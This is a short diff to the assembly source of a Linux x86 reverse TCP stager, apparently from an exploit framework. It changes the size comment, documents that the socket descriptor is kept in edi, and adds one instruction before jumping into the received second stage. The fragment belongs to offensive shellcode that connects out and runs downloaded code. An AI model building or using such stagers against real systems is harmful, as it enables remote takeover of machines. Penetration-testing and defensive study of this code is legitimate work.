@@ -1,7 +1,7 @@
 ;;
 ; 
 ;        Name: stager_sock_reverse
-;        Size: 50 bytes
+;        Size: 52 bytes
 ;   Qualities: Can Have Nulls
 ;     Authors: skape <mmiller [at] hick.org>
 ;     Version: $Revision$
@@ -14,6 +14,8 @@
 ; Description:
 ;
 ;        Implementation of a Linux reverse TCP stager.
+;
+;        File descriptor in edi.
 ;
 ;;
 BITS   32
@@ -54,4 +56,5 @@ recv:
 	mov  dh, 0xc
 	mov  al, 0x3
 	int  0x80
+	mov  edi, ebx    ; not necessary if second stages use ebx instead of edi for fd
 	jmp  ecx
